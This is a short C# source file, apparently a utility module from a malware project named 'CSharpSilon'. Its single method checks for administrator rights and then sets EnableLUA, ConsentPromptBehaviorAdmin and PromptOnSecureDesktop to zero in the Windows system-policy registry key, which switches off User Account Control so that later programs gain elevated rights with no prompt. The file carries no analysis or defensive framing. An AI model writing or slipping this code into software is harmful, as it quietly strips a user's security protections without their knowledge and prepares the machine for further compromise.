using System;
using System.Security.Principal;
using System.Text;
using Microsoft.Win32;

namespace CSharpSilon.Utils
{
    public class UAC
    {
        public static void Run()
        {
            RegistryKey RegKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
            if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
            {
                return;
            }
            RegKey.SetValue("consentpromptbehavioradmin", "0", RegistryValueKind.DWord);
            RegKey.SetValue("enablelua", "0", RegistryValueKind.DWord);
            RegKey.SetValue("promptonsecuredesktop", "0", RegistryValueKind.DWord);
            RegKey.GetValue("enablelua", null);
            RegKey.Close();
        }
        
    }
}